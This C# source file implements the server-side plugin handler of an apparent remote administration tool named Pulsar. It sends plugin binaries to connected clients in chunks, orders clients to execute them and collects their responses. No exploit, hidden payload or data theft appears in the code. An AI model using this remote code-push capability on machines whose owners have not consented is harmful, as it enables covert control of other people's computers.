using Pulsar.Plugin.Common;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Plugin;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.IO;
using Pulsar.Server.Networking;
using Pulsar.Server.Plugin;
using System;
using System.Threading;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles plugin-related messages on the server side.
    /// </summary>
    public class PluginHandler : MessageProcessorBase<object>, IDisposable
    {
        private readonly ServerPluginManager _pluginManager;
        private readonly Client _client;

        private bool _disposed = false; public PluginHandler(Client client, ServerPluginManager sharedPluginManager) : base(true)
        {
            _client = client;
            _pluginManager = sharedPluginManager ?? new ServerPluginManager();

            var clientId = _client.Value?.Id ?? "unknown";
            _pluginManager.RegisterClientExecutor(clientId, ExecutePluginOnClient);
        }

        private void ExecutePluginOnClient(string clientId, string pluginName, string workId, byte[] input)
        {
            var thisClientId = _client.Value?.Id ?? "unknown";
            if (clientId == thisClientId)
            {
                ExecutePlugin(pluginName, workId, input);
            }
        }

        public override bool CanExecute(IMessage message) => message is DoPluginExecution;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoPluginExecution execution:
                    Execute(sender, execution);
                    break;
            }
        }

        private void Execute(ISender sender, DoPluginExecution message)
        {
            try
            {
                string clientId = _client.Value?.Id ?? "unknown"; switch (message.Type)
                {
                    case PluginOperationType.Response:
                        _pluginManager.HandleClientPluginResponse(clientId, message.PluginName, message.WorkId, message.Output);
                        break;

                    case PluginOperationType.Error:
                        _pluginManager.HandleClientPluginResponse(clientId, message.PluginName, message.WorkId, message.Output);
                        break;
                }

                OnReport($"Plugin '{message.PluginName}' {message.Type.ToString().ToLower()} processed");
            }
            catch (Exception ex)
            {
                OnReport($"Error processing plugin message: {ex.Message}");
            }
        }        
        
        /// <summary>
        /// Distributes a plugin to the connected client using chunked transfer.
        /// </summary>
        /// <param name="pluginName">Name of the plugin to distribute.</param>
        public void DistributePlugin(string pluginName)
        {
            try
            {
                // Get client plugin bytes from the Client plugins directory
                byte[] pluginBytes = _pluginManager.GetClientPluginBytes(pluginName);
                if (pluginBytes != null)
                {
                    DistributePluginChunked(pluginName, pluginBytes);
                }
                else
                {
                    OnReport($"Client plugin '{pluginName}' not found in Plugins/Client directory");
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error distributing plugin '{pluginName}': {ex.Message}");
            }
        }

        /// <summary>
        /// Distributes a plugin using chunked transfer to avoid packet size limits.
        /// </summary>
        /// <param name="pluginName">Name of the plugin to distribute.</param>
        /// <param name="pluginBytes">The plugin data bytes.</param>
        private void DistributePluginChunked(string pluginName, byte[] pluginBytes)
        {
            new Thread(() =>
            {
                try
                {
                    using (var pluginSplit = new PluginSplit(pluginBytes))
                    {
                        var totalChunks = pluginSplit.GetTotalChunks();
                        var chunkIndex = 0;

                        OnReport($"Starting chunked distribution of plugin '{pluginName}' ({pluginBytes.Length} bytes, {totalChunks} chunks)");

                        foreach (var chunk in pluginSplit)
                        {
                            var isFirstChunk = chunkIndex == 0;
                            var isLastChunk = chunkIndex == totalChunks - 1;

                            _client.Send(new DoPluginDistributionChunk
                            {
                                PluginName = pluginName,
                                TotalSize = pluginBytes.Length,
                                Chunk = chunk,
                                IsFirstChunk = isFirstChunk,
                                IsLastChunk = isLastChunk,
                                ChunkIndex = chunkIndex,
                                TotalChunks = totalChunks
                            });

                            chunkIndex++;

                            OnReport($"Sent chunk {chunkIndex}/{totalChunks} for plugin '{pluginName}'");

                            // short delay to avoid potential DDOS
                            Thread.Sleep(10);
                        }

                        OnReport($"Completed chunked distribution of plugin '{pluginName}'");
                    }
                }
                catch (Exception ex)
                {
                    OnReport($"Error during chunked plugin distribution for '{pluginName}': {ex.Message}");
                    
                    _client.Send(new DoPluginDistributionComplete
                    {
                        PluginName = pluginName,
                        Success = false,
                        ErrorMessage = ex.Message
                    });
                }
            }) { IsBackground = true }.Start();
        }

        /// <summary>
        /// Executes a plugin on the client.
        /// </summary>
        /// <param name="pluginName">Name of the plugin to execute.</param>
        /// <param name="workId">Work ID for tracking this operation.</param>
        /// <param name="input">Input data for the plugin.</param>
        public void ExecutePlugin(string pluginName, string workId, byte[] input)
        {
            try
            {
                _client.Send(new DoPluginExecution
                {
                    PluginName = pluginName,
                    WorkId = workId,
                    Type = PluginOperationType.Execute,
                    Output = input
                });

                Console.WriteLine("Executing plugin: " + pluginName);

                OnReport($"Plugin '{pluginName}' execution requested with work ID '{workId}'");
            }
            catch (Exception ex)
            {
                OnReport($"Error requesting plugin execution: {ex.Message}");
            }
        }

        /// <summary>
        /// Gets the plugin manager instance.
        /// </summary>
        public ServerPluginManager PluginManager => _pluginManager;

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this handler.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed && disposing)
            {
                try
                {
                    // Unregister the client executor when this handler is disposed
                    var clientId = _client.Value?.Id ?? "unknown";
                    _pluginManager.UnregisterClientExecutor(clientId);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error during PluginHandler disposal: {ex.Message}");
                }
                _disposed = true;
            }
        }
    }
}